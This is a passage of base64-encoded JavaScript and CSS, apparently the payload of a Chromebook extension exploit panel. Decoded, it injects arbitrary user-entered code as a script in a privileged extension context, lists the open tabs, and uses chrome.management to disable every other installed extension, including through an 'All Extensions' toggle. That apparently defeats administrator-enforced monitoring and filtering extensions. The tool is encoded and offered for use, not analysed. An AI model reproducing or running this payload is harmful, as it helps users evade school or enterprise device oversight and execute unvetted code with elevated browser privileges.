CAgICApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwgMTAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgfTsKCiAgICAgICAgICAgICAgICAgICAgICAgIGRpdi5hcHBlbmRDaGlsZChwcmV2aWV3QnV0dG9uKTsKICAgICAgICAgICAgICAgICAgICAgICAgdGFibGlzdC5hcHBlbmRDaGlsZChkaXYpOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIHRoaXoudGFiTGlzdEluUHJvZ3Jlc3MgPSBmYWxzZTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9KTsKICAgICAgICB9KTsKICAgIH0KICAgIGFjdGl2YXRlKCkgewogICAgICAgIGRvY3VtZW50LmJvZHkuaW5zZXJ0QWRqYWNlbnRIVE1MKAogICAgICAgICAgICAiYmVmb3JlZW5kIiwKICAgICAgICAgICAgRGVmYXVsdEV4dGVuc2lvbkNhcGFiaWxpdGllcy50ZW1wbGF0ZQogICAgICAgICk7CgogICAgICAgIGRvY3VtZW50LmJvZHkKICAgICAgICAgICAgLnF1ZXJ5U2VsZWN0b3IoIiNleHRfZGVmYXVsdCIpCiAgICAgICAgICAgIC5xdWVyeVNlbGVjdG9yQWxsKCJidXR0b24iKQogICAgICAgICAgICAuZm9yRWFjaChmdW5jdGlvbihidG4pIHsKCiAgICAgICAgICAgICAgICBidG4uYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCB0aGlzLm9uQnRuQ2xpY2tfLmJpbmQodGhpcywgYnRuKSk7CiAgICAgICAgICAgIH0sIHRoaXMpOwoKICAgICAgICB0aGlzLnVwZGF0ZVRhYkxpc3QoKTsKICAgICAgICBmb3IgKGxldCBpIGluIGNocm9tZS50YWJzKSB7CiAgICAgICAgICAgIGlmIChpLnN0YXJ0c1dpdGgoIm9uIikpIHsKICAgICAgICAgICAgICAgIGNocm9tZS50YWJzW2ldLmFkZExpc3RlbmVyKCgpID0+IHsKICAgICAgICAgICAgICAgICAgICB0aGlzLnVwZGF0ZVRhYkxpc3QoKTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgIH0KICAgIHN0YXRpYyBnZXRGUygpIHsKICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoZnVuY3Rpb24ocmVzb2x2ZSkgewogICAgICAgICAgICB3ZWJraXRSZXF1ZXN0RmlsZVN5c3RlbShURU1QT1JBUlksIDIgKiAxMDI0ICogMTAyNCwgcmVzb2x2ZSk7CiAgICAgICAgfSk7CiAgICB9CiAgICBzdGF0aWMgYXN5bmMgd3JpdGVGaWxlKGZpbGUsIGRhdGEpIHsKICAgICAgICBjb25zdCBmcyA9IGF3YWl0IERlZmF1bHRFeHRlbnNpb25DYXBhYmlsaXRpZXMuZ2V0RlMoKTsKICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUsIHJlamVjdCkgPT4gewogICAgICAgICAgICBmcy5yb290LmdldEZpbGUoZmlsZSwgewogICAgICAgICAgICAgICAgY3JlYXRlOiB0cnVlCiAgICAgICAgICAgIH0sIGZ1bmN0aW9uKGVudHJ5KSB7CiAgICAgICAgICAgICAgICBlbnRyeS5yZW1vdmUoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgZnMucm9vdC5nZXRGaWxlKGZpbGUsIHsKICAgICAgICAgICAgICAgICAgICAgICAgY3JlYXRlOiB0cnVlCiAgICAgICAgICAgICAgICAgICAgfSwgZnVuY3Rpb24oZW50cnkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgZW50cnkuY3JlYXRlV3JpdGVyKGZ1bmN0aW9uKHdyaXRlcikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGVyLndyaXRlKG5ldyBCbG9iKFtkYXRhXSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGVyLm9ud3JpdGVlbmQgPSByZXNvbHZlLmJpbmQobnVsbCwgZW50cnkudG9VUkwoKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0pOwogICAgICAgIH0pOwogICAgfQogICAgc3RhdGljIGFzeW5jIGV2YWxDb2RlKGNvZGUpIHsKICAgICAgICBjb25zdCB1cmwgPSBhd2FpdCBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzLndyaXRlRmlsZSgic3JjLmpzIiwgY29kZSk7CiAgICAgICAgbGV0IHNjcmlwdCA9CiAgICAgICAgICAgIGRvY3VtZW50LmJvZHkucXVlcnlTZWxlY3RvcigiI2V2YWx1YXRlX2VsZW0iKSA/PwogICAgICAgICAgICBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTsKICAgICAgICBzY3JpcHQucmVtb3ZlKCk7CiAgICAgICAgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7CiAgICAgICAgc2NyaXB0LmlkID0gImV2YWx1YXRlX2VsZW0iOwogICAgICAgIHNjcmlwdC5zcmMgPSB1cmw7CiAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzY3JpcHQpOwogICAgfQoKICAgIGFzeW5jIG9uQnRuQ2xpY2tfKGIpIHsKICAgICAgICBzd2l0Y2ggKGIuaWQpIHsKICAgICAgICAgICAgY2FzZSAiY29kZV9ldmFsdWF0ZSI6IHsKICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCJFdmFsdWF0aW5nIGNvZGUhIik7CiAgICAgICAgICAgICAgICBjb25zdCB4ID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiI2NvZGVfaW5wdXQiKS52YWx1ZTsKICAgICAgICAgICAgICAgIGNvbnN0IGZzID0gYXdhaXQgRGVmYXVsdEV4dGVuc2lvbkNhcGFiaWxpdGllcy5nZXRGUygpOwogICAgICAgICAgICAgICAgRGVmYXVsdEV4dGVuc2lvbkNhcGFiaWxpdGllcy5ldmFsQ29kZSh4KTsKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXNlICJ0YWJyZWxvYWQiOiB7CiAgICAgICAgICAgICAgICB0aGlzLnVwZGF0ZVRhYkxpc3QoKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQpjbGFzcyBIb3N0UGVybWlzc2lvbnMgewogICAgYWN0aXZhdGUoKSB7fQp9CgpmdW5jdGlvbiBjcmVhdGVFeHRlbnNpb25DYXJkKG5hbWUsIGlkLCBlbmFibGVkLCBpY29uX3VybCkgewogIGNvbnN0IGxpID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgibGkiKTsKICBsaS5jbGFzc05hbWUgPSAiZXh0ZW5zaW9uLWNhcmQiOwoKICBjb25zdCBoZWFkZXJEaXYgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICBoZWFkZXJEaXYuY2xhc3NOYW1lID0gImV4dGVuc2lvbi1oZWFkZXIiOwoKICBjb25zdCBpY29uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7CiAgaWNvbi5jbGFzc05hbWUgPSAiZXh0ZW5zaW9uLWljb24iOwogIGljb24uc3JjID0gaWNvbl91cmw7CiAgaWNvbi5hbHQgPSAiRXh0ZW5zaW9uIEljb24iOwoKICBjb25zdCBuYW1lRGl2ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgbmFtZURpdi5jbGFzc05hbWUgPSAiZXh0ZW5zaW9uLW5hbWUiOwogIG5hbWVEaXYudGV4dENvbnRlbnQgPSBuYW1lOwoKICBoZWFkZXJEaXYuYXBwZW5kQ2hpbGQoaWNvbik7CiAgaGVhZGVyRGl2LmFwcGVuZENoaWxkKG5hbWVEaXYpOwoKICBjb25zdCBpZERpdiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogIGlkRGl2LmNsYXNzTmFtZSA9ICJleHRlbnNpb24taWQiOwogIGlkRGl2LnRleHRDb250ZW50ID0gaWQ7CgogIGNvbnN0IHN3aXRjaExhYmVsID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgibGFiZWwiKTsKICBzd2l0Y2hMYWJlbC5jbGFzc05hbWUgPSAic3dpdGNoIjsKCiAgY29uc3QgY2hlY2tib3ggPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbnB1dCIpOwogIGNoZWNrYm94LnR5cGUgPSAiY2hlY2tib3giOwogIGlmIChlbmFibGVkKSBjaGVja2JveC5jaGVja2VkID0gdHJ1ZTsKCiAgY29uc3Qgc2xpZGVyU3BhbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNwYW4iKTsKICBzbGlkZXJTcGFuLmNsYXNzTmFtZSA9ICJzbGlkZXIiOwoKICBzd2l0Y2hMYWJlbC5hcHBlbmRDaGlsZChjaGVja2JveCk7CiAgc3dpdGNoTGFiZWwuYXBwZW5kQ2hpbGQoc2xpZGVyU3Bhbik7CgogIGxpLmFwcGVuZENoaWxkKGhlYWRlckRpdik7CiAgbGkuYXBwZW5kQ2hpbGQoaWREaXYpOwogIGxpLmFwcGVuZENoaWxkKHN3aXRjaExhYmVsKTsKCiAgcmV0dXJuIGxpOwp9CgpmdW5jdGlvbiBjcmVhdGVFeHRlbnNpb25DYXJkQWxsKGVuYWJsZWQgPSB0cnVlKSB7CiAgY29uc3QgbGkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsaSIpOwogIGxpLmNsYXNzTmFtZSA9ICJleHRlbnNpb24tY2FyZC1hbGwiOwogIGxpLmlubmVySFRNTCA9IGAKICAgIDxkaXYgY2xhc3M9ImV4dGVuc2lvbi1oZWFkZXIiPgogICAgICA8aW1nIGNsYXNzPSJleHRlbnNpb24taWNvbiIgc3JjPSJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vVDNNMU40TC9UM00xTjRML3JlZnMvaGVhZHMvbWFpbi9pbWFnZXMvWE9zWC5naWYiIC8+CiAgICAgIDxkaXYgY2xhc3M9ImV4dGVuc2lvbi1uYW1lIj5BbGwgRXh0ZW5zaW9uczwvZGl2PgogICAgPC9kaXY+CiAgICA8bGFiZWwgY2xhc3M9InN3aXRjaCI+CiAgICAgIDxpbnB1dCB0eXBlPSJjaGVja2JveCIgJHtlbmFibGVkID8gImNoZWNrZWQiIDogIiJ9PgogICAgICA8c3BhbiBjbGFzcz0ic2xpZGVyIj48L3NwYW4+CiAgICA8L2xhYmVsPgogIGA7CiAgcmV0dXJuIGxpOwp9CgpmdW5jdGlvbiB1cGRhdGVFeHRlbnNpb25TdGF0dXMoZXh0bGlzdF9lbGVtZW50KSB7CiAgICByZXR1cm4gbmV3IFByb21pc2UoZnVuY3Rpb24ocmVzb2x2ZSwgcmVqZWN0KSB7CiAgICAgICAgZXh0bGlzdF9lbGVtZW50LmlubmVySFRNTCA9ICIiOwogICAgICAgIGxldCBjYXJkQWxsID0gY3JlYXRlRXh0ZW5zaW9uQ2FyZEFsbCgpOwogICAgICAgIGxldCBjYXJkSW5wdXRBbGwgPSBjYXJkQWxsLnF1ZXJ5U2VsZWN0b3IoImlucHV0Iik7CgogICAgICAgIGNhcmRJbnB1dEFsbC5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCAoZXZlbnQpID0+IHsKICAgICAgICAgICAgY2FyZElucHV0QWxsLmRpc2FibGVkID0gdHJ1ZTsKICAgICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuZ2V0U2VsZihmdW5jdGlvbihzZWxmKSB7CiAgICAgICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5nZXRBbGwoZnVuY3Rpb24oZXh0ZW5zaW9ucykgewogICAgICAgICAgICAgICAgICAgIGlmIChjaHJvbWUucnVudGltZS5sYXN0RXJyb3IpIHsKICAgICAgICAgICAgICAgICAgICAgICAgYWxlcnQoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiRXJyb3IgbG9hZGluZyBleHRlbnNpb25zOiAiICsgY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yLm1lc3NhZ2UKICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHJlamVjdChjaHJvbWUucnVudGltZS5sYXN0RXJyb3IpOwogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgY29uc3QgcHJvbWlzZXMgPSBbXTsKICAgICAgICAgICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGV4dGVuc2lvbnMubGVuZ3RoOyBpKyspIHsKICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGV4dElkID0gZXh0ZW5zaW9uc1tpXS5pZDsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGV4dElkICE9PSBzZWxmLmlkKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9taXNlcy5wdXNoKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS5tYW5hZ2VtZW50LnNldEVuYWJsZWQoZXh0SWQsIGV2ZW50LnRhcmdldC5jaGVja2VkKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBQcm9taXNlLmFsbChwcm9taXNlcykKICAgICAgICAgICAgICAgICAgICAgICAgLnRoZW4oKCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FyZElucHV0QWxsLmRpc2FibGVkID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXNvbHZlKCk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAgICAgICAgIC5jYXRjaCgoZXJyb3IpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFsZXJ0KCJFcnJvciBlbmFibGluZy9kaXNhYmxpbmcgZXh0ZW5zaW9uczogIiArIGVycm9yLm1lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVqZWN0KGVycm9yKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfSk7CiAgICAgICAgfSk7CgogICAgICAgIGV4dGxpc3RfZWxlbWVudC5hcHBlbmRDaGlsZChjYXJkQWxsKTsKCiAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuZ2V0QWxsKGZ1bmN0aW9uKGV4dGxpc3QpIHsKICAgICAgICAgICAgaWYgKGNocm9tZS5ydW50aW1lLmxhc3RFcnJvcikgewogICAgICAgICAgICAgICAgYWxlcnQoIkVycm9yIGxvYWRpbmcgZXh0ZW5zaW9uczogIiArIGNocm9tZS5ydW50aW1lLmxhc3RFcnJvci5tZXNzYWdlKTsKICAgICAgICAgICAgICAgIHJldHVybiByZWplY3QoY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgY29uc3Qgb3JkbGlzdCA9IFtdOwogICAgICAgICAgICBleHRsaXN0LmZvckVhY2goZnVuY3Rpb24oZXh0ZW5zaW9uKSB7CiAgICAgICAgICAgICAgICBpZiAoZXh0ZW5zaW9uLmlkID09PSBuZXcgVVJMKG5ldyBVUkwobG9jYXRpb24uaHJlZikub3JpZ2luKS5ob3N0KSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgb3JkbGlzdC5wdXNoKGV4dGVuc2lvbik7CgogICAgICAgICAgICAgICAgY29uc3QgaWNvbiA9CiAgICAgICAgICAgICAgICAgICAgZXh0ZW5zaW9uLmljb25zPy5maW5kKChpYykgPT4gaWMuc2l6ZSA9PT0gMTI4KSA/PwogICAgICAgICAgICAgICAgICAgIGV4dGVuc2lvbi5pY29ucz8uYXQoLTEpOwoKICAgICAgICAgICAgICAgIGxldCBjYXJkID0gY3JlYXRlRXh0ZW5zaW9uQ2FyZCgKICAgICAgICAgICAgICAgICAgICBleHRlbnNpb24ubmFtZSwKICAgICAgICAgICAgICAgICAgICBleHRlbnNpb24uaWQsCiAgICAgICAgICAgICAgICAgICAgZXh0ZW5zaW9uLmVuYWJsZWQsCiAgICAgICAgICAgICAgICAgICAgaWNvbj8udXJsIHx8CiAgICAgICAgICAgICAgICAgICAgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9UM00xTjRML1QzTTFONEwvcmVmcy9oZWFkcy9tYWluL2ltYWdlcy9YT3NYLmdpZiIKICAgICAgICAgICAgICAgICk7CgogICAgICAgICAgICAgICAgbGV0IGNhcmRJbnB1dCA9IGNhcmQucXVlcnlTZWxlY3RvcigiaW5wdXQiKTsKCiAgICAgICAgICAgICAgICBjYXJkSW5wdXQuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgKGV2ZW50KSA9PiB7CiAgICAgICAgICAgICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuc2V0RW5hYmxlZCgKICAgICAgICAgICAgICAgICAgICAgICAgZXh0ZW5zaW9uLmlkLAogICAgICAgICAgICAgICAgICAgICAgICBldmVudC50YXJnZXQuY2hlY2tlZCwKICAgICAgICAgICAgICAgICAgICAgICAgKHJlc3VsdCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNocm9tZS5ydW50aW1lLmxhc3RFcnJvcikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFsZXJ0KAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiRXJyb3IgdXBkYXRpbmcgZXh0ZW5zaW9uIHN0YXR1czogIiArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS5ydW50aW1lLmxhc3RFcnJvci5tZXNzYWdlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICB9KTsKCiAgICAgICAgICAgICAgICBjYXJkLnF1ZXJ5U2VsZWN0b3IoIi5leHRlbnNpb24taWNvbiIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgKCkgPT4gewogICAgICAgICAgICAgICAgICAgIHVzZXJkZWZJZHMgPSBKU09OLnBhcnNlKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJ1c2VyZGVmSWRzIikpOwogICAgICAgICAgICAgICAgICAgIGlmICh1c2VyZGVmSWRzLmluY2x1ZGVzKGV4dGVuc2lvbi5pZCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdXNlcmRlZklkcy5yZW1vdmUoZXh0ZW5zaW9uLmlkKTsKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oInVzZXJkZWZJZHMiLCBKU09OLnN0cmluZ2lmeSh1c2VyZGVmSWRzKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIG1ha2VUb2FzdCgicmVtb3ZlZCAiICsgZXh0ZW5zaW9uLnNob3J0TmFtZSArICIgZnJvbSB0aGUgbGlzdCIsIDIpOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJkZWZJZHMucHVzaChleHRlbnNpb24uaWQpOwogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgidXNlcmRlZklkcyIsIEpTT04uc3RyaW5naWZ5KHVzZXJkZWZJZHMpKTsKICAgICAgICAgICAgICAgICAgICAgICAgbWFrZVRvYXN0KCJhZGRlZCAiICsgZXh0ZW5zaW9uLnNob3J0TmFtZSArICIgdG8gdGhlIGxpc3QiLCAyKTsKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIGlmIChsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgidXNlcmRlZklkcyIpID09PSBKU09OLnN0cmluZ2lmeShbXSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC5xdWVyeVNlbGVjdG9yKCIjZGlzYWJsZS11c2VyZGVmLWV4dHMiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgLnNldEF0dHJpYnV0ZSgic3R5bGUiLCAiZGlzcGxheTogbm9uZTsiKTsKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICBkb2N1bWVudAogICAgICAgICAgICAgICAgICAgICAgICAgICAgLnF1ZXJ5U2VsZWN0b3IoIiNkaXNhYmxlLXVzZXJkZWYtZXh0cyIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAuc2V0QXR0cmlidXRlKCJzdHlsZSIsICJkaXNwbGF5OiBpbmxpbmU7Iik7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAgICAgZXh0bGlzdF9lbGVtZW50LmFwcGVuZENoaWxkKGNhcmQpOwogICAgICAgICAgICB9KTsKICAgICAgICAgICAgc2F2ZWRFeHRMaXN0ID0gb3JkbGlzdDsKICAgICAgICAgICAgcmVzb2x2ZSgpOwogICAgICAgIH0pOwogICAgfSk7Cn0KCmNvbnN0IGZpbGVNYW5hZ2VyUHJpdmF0ZVRlbXBsYXRlID0gYAogIDxkaXYgaWQ9ImZpbGVNYW5hZ2VyUHJpdmF0ZV9jYXAiPgogICAgPGRpdiBpZD0iRk1QX29wZW5VUkwiPgogICAgICA8YnV0dG9uIGlkPSJidG5fRk1QX29wZW5VUkwiPk9wZW4gVVJMIGluIFNraW92b3ggd2luZG93PC9idXR0b24+CiAgICA8L2Rpdj4KICA8L2Rpdj4KCmA7CmNvbnN0IGh0bWxTdHlsZSA9IGAKPHN0eWxlPgpAaW1wb3J0IHVybCgnaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3MyP2ZhbWlseT1Sb2JvdG86d2dodEA0MDAmZGlzcGxheT1zd2FwJyk7CgoqIHsKICBmb250LWZhbWlseTogJ1JvYm90bycsIEFyaWFsLCBzYW5zLXNlcmlmOwp9Cgpib2R5IHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjMWUxZjIyOwogIGNvbG9yOiAjZmZmOwogIG1hcmdpbjogMDsKICBwYWRkaW5nOiAyMHB4Owp9Cgpib2R5Ojotd2Via2l0LXNjcm9sbGJhciwKZGlhbG9nOjotd2Via2l0LXNjcm9sbGJhciwKZGlhbG9nIGRpdjo6LXdlYmtpdC1zY3JvbGxiYXIgewogIGRpc3BsYXk6IG5vbmU7Cn0KCnAgewogIG1hcmdpbjogNXB4IGF1dG87CiAgY29sb3I6IHdoaXRlOwp9CgojY2hyb21lX21hbmFnZW1lbnRfZGlzYWJsZV9leHQsICNleHRfZGVmYXVsdCB7CiAgbWF4LXdpZHRoOiAxMjAwcHg7CiAgbWFyZ2luOiAwIGF1dG87Cn0KCmgxIHsKICBmb250LXNpemU6IDI0cHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKLmRlc2NyaXB0aW9uIHsKICBtYXJnaW4tYm90dG9tOiAyMHB4Owp9Cgp1bCB7CiAgbGlzdC1zdHlsZS10eXBlOiBub25lOwogIHBhZGRpbmc6IDA7CiAgbWFyZ2luOiAwOwogIHBhZGRpbmctYm90dG9tOiA1MHB4OwogIGRpc3BsYXk6IGZsZXg7CiAgZmxleC13cmFwOiB3cmFwOwogIGdhcDogMTBweDsKICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsKfQoKLmV4dGVuc2lvbi1jYXJkLCAuZXh0ZW5zaW9uLWNhcmQtYWxsIHsKICBtYXJnaW4tbGVmdDogNXB4OwogIG1hcmdpbi1ib3R0b206IDZweDsKICBiYWNrZ3JvdW5kOiAjMjkyYTJkOwogIGJvcmRlci1yYWRpdXM6IDEwcHg7CiAgd2lkdGg6IDM3NXB4OwogIGhlaWdodDogMTQwcHg7CiAgcGFkZGluZzogMTBweDsKICBkaXNwbGF5OiBmbGV4OwogIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47CiAgZ2FwOiAxMHB4OwogIHBhZGRpbmc6IDEwcHg7CiAgcG9zaXRpb246IHJlbGF0aXZlOwogIGJveC1zaGFkb3c6IDAgNHB4IDhweCByZ2JhKDAsIDAsIDAsIDAuMik7Cn0KCi5leHRlbnNpb24taGVhZGVyIHsKICBkaXNwbGF5OiBmbGV4OwogIGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAgbWFyZ2luLWJvdHRvbTogMjVweDsKICBtYXJnaW4tdG9wOiAxMHB4Owp9CgouZXh0ZW5zaW9uLWljb24gewogIHdpZHRoOiAzMnB4OwogIGhlaWdodDogMzJweDsKICBmbGV4LXNocmluazogMDsKICB1c2VyLXNlbGVjdDogbm9uZTsKICBtYXJnaW4tbGVmdDogMTBweDsKICBtYXJnaW4tcmlnaHQ6IDEwcHg7Cn0KCi5leHRlbnNpb24tbmFtZSB7CiAgZm9udC1zaXplOiAxM3B4OwogIGNvbG9yOiB3aGl0ZTsKfQoKLmV4dGVuc2lvbi1pZCB7CiAgZm9udC1zaXplOiAxM3B4OwogIGNvbG9yOiAjYzRjN2M1OwogIG1hcmdpbi1sZWZ0OiAxMHB4Owp9Cgouc3dpdGNoIHsKICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgIGRpc3BsYXk6IGlubGluZS1ibG9jazsKICAgIHdpZHRoOiAyOHB4OwogICAgaGVpZ2h0OiAxNnB4OwogICAgcmlnaHQ6IDIwcHg7CiAgICBib3R0b206IDE1cHg7Cn0KCi5zd2l0Y2ggaW5wdXQgewogIG9wYWNpdHk6IDA7CiAgd2lkdGg6IDA7CiAgaGVpZ2h0OiAwOwp9Cgouc2xpZGVyIHsKICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgY3Vyc29yOiBwb2ludGVyOwogIHRvcDogMDsKICBsZWZ0OiAwOwogIHJpZ2h0OiAwOwogIGJvdHRvbTogMDsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjNDQ0NzQ2OwogIGJvcmRlci1yYWRpdXM6IDE1cHg7CiAgYm9yZGVyOiAxLjVweCBzb2xpZCAjOGU5MThmOwogIHRyYW5zaXRpb246IGJhY2tncm91bmQtY29sb3IgMC4xcyBlYXNlLWluLW91dCwgYm9yZGVyLWNvbG9yIDAuMXMgZWFzZS1pbi1vdXQ7Cn0KCi5zbGlkZXI6YmVmb3JlIHsKICBjb250ZW50OiAiIjsKICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgaGVpZ2h0OiAxMnB4OwogIHdpZHRoOiAxMnB4OwogIGxlZnQ6IDJweDsKICB0b3A6IDUwJTsKICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoLTUwJSkgc2NhbGUoMC44KTsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjOGU5MThmOwogIGJvcmRlci1yYWRpdXM6IDUwJTsKICB0cmFuc2l0aW9uOiB0cmFuc2Zvcm0gMC4xcyBlYXNlLWluLW91dCwgYmFja2dyb3VuZC1jb2xvciAwLjFzIGVhc2UtaW4tb3V0Owp9Cgouc3dpdGNoOmhvdmVyIC5zbGlkZXI6YmVmb3JlIHsKICBib3gtc2hhZG93OiAwIDAgNnB4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC41KTsKfQoKaW5wdXQ6Y2hlY2tlZCArIC5zbGlkZXIgewogIGJhY2tncm91bmQtY29sb3I6ICNhOGM3ZmE7CiAgYm9yZGVyLWNvbG9yOiAjYThjN2ZhOwp9CgppbnB1dDpjaGVja2VkICsgLnNsaWRlcjpiZWZvcmUgewogIHRyYW5zZm9ybTogdHJhbnNsYXRlKDEwcHgsIC01MCUpIHNjYWxlKDEpOwogIGJhY2tncm91bmQtY29sb3I6ICMwNjJlNmY7Cn0KCi5oZWFkZXIgewogIGRpc3BsYXk6IGZsZXg7CiAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsKfQoKLmxvZ28gewogIHdpZHRoOiA0ZW07CiAgaGVpZ2h0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogMTBweDsKfQoKLnRhYmxpc3QtaXRlbSB7CiAgYm9yZGVyOiAxcHggc29saWQgIzMzMzsKICBtYXJnaW4tYm90dG9tOiAxMHB4OwogIGJhY2tncm91bmQtY29sb3I6ICMwMDA7CiAgcGFkZGluZzogMTVweDsKICBib3JkZXItcmFkaXVzOiA4cHg7CiAgZGlzcGxheTogZmxleDsKICBmb250LXdlaWdodDogYm9sZDsKICBhbGlnbi1pdGVtczogY2VudGVyOwp9CgoudGFibGlzdC1pdGVtIGltZyB7CiAgbWF4LXdpZHRoOiAyNXB4OwogIG1hcmdpbi1yaWdodDogMTBweDsKfQoKLnRhYmxpc3QtaXRlbSBzcGFuIHsKICBwYWRkaW5nOiAxMHB4IDA7CiAgdGV4dC1vdmVyZmxvdzogZWxsaXBzaXM7CiAgd2lkdGg6IDEwMCU7CiAgd2hpdGUtc3BhY2U6IG5vd3JhcDsKICBvdmVyZmxvdzogaGlkZGVuOwogIHdvcmQtYnJlYWs6IGJyZWFrLWFsbDsKfQoKLnRhYmxpc3